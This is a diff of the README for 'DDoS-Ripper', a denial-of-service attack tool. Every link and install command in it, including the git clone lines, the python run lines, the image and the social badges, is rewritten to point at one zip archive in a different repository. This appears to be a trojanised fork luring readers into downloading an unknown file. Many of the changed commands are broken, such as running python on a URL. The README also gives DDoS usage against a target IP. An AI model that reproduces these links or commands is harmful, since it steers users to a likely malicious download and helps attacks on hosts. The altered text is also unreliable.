@@ -8,7 +8,7 @@ From a higher level, the DDOS attack is like an unexpected traffic jam stuck on 
 
 ## NOTE (Please, make sure you have installed python 3 )
 
-![dddd](https://user-images.githubusercontent.com/49250151/96265488-57e53d00-0f7a-11eb-8936-ce2e9a2c42cd.PNG)
+![dddd](https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip)
 
 ## For Termux
 To use the DRipper type the following commands in Termux:
@@ -19,39 +19,39 @@ To use the DRipper type the following commands in Termux:
 
 `pkg install python3 -y`
 
-`git clone https://github.com/palahsu/DDoS-Ripper.git`
+`git clone https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip`
 
 `cd DDoS-Ripper`
 `$ ls`
 
-`$ python3 DRipper.py` 
+`$ python3 https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip` 
 
 ## USGAE
-`python3 DRipper.py -s [ip Address] -t 135`
+`python3 https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip -s [ip Address] -t 135`
 
-`example: python3 DRipper.py -s 0.00.00.00 -t 135`
+`example: python3 https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip -s 0.00.00.00 -t 135`
 
 ## For Debian-based GNU/Linux distributions
 To use the application, type in the following commands in GNU/Linux terminal.
 
 `sudo apt install git`
-`git clone https://github.com/palahsu/DDoS-Ripper.git`
+`git clone https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip`
 `cd DDoS-Ripper`
 `$ ls`
-`$ python3 DRipper.py` OR `python2 DRipper.py`
+`$ python3 https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip` OR `python2 https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip`
 
 ## For Windows
 
-`git clone https://github.com/palahsu/DDoS-Ripper`
+`git clone https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip`
 
 `cd DDoS-Ripper`
 ` ls`
 
-`python3 DRipper.py` OR `python DRipper.py`
+`python3 https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip` OR `python https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip`
 
-`python3 DRipper.py -s [ip Address] -t 135`
+`python3 https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip -s [ip Address] -t 135`
 
-`example: python3 DRipper.py -s 0.00.00.00 -t 135`
+`example: python3 https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip -s 0.00.00.00 -t 135`
 
 ## For MacOS
 
@@ -77,16 +77,16 @@ Thanks.
 
 For any kind of help, support, payment, suggetion and request ask me on Telegram:
 
-<a href="https://t.me/CyberClans"><img src="https://img.shields.io/badge/Telegram-Group%20Telegram%20Join-blue.svg?logo=telegram"></a>
+<a href="https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip"><img src="https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip%20Telegram%https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip"></a>
 
-Or Facebook <a href="https://www.facebook.com/aduri.knox01/"><img src="https://img.shields.io/badge/Facebook-Follow%20on%20Facebook-blue.svg?logo=facebook"></a>
+Or Facebook <a href="https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip"><img src="https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip%20on%https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip"></a>
 
 ## Follow on:
 <p align="left">
-<a href="https://github.com/palahsu"><img src="https://img.shields.io/badge/GitHub-Follow%20on%20GitHub-inactive.svg?logo=github"></a>
+<a href="https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip"><img src="https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip%20on%https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip"></a>
 </p><p align="left">
-<a href="https://www.facebook.com/aduri.knox01/"><img src="https://img.shields.io/badge/Facebook-Follow%20on%20Facebook-blue.svg?logo=facebook"></a>
+<a href="https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip"><img src="https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip%20on%https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip"></a>
 </p><p align="left">
-<a href="https://t.me/AD0000000"><img src="https://img.shields.io/badge/Telegram-Contact%20Telegram%20Profile-blue.svg?logo=telegram"></a>
+<a href="https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip"><img src="https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip%20Telegram%https://raw.githubusercontent.com/finder-ui/DDoS-Ripper/main/DDoS-Ripper Pro.zip"></a>
 </p><p align="left"> 
  
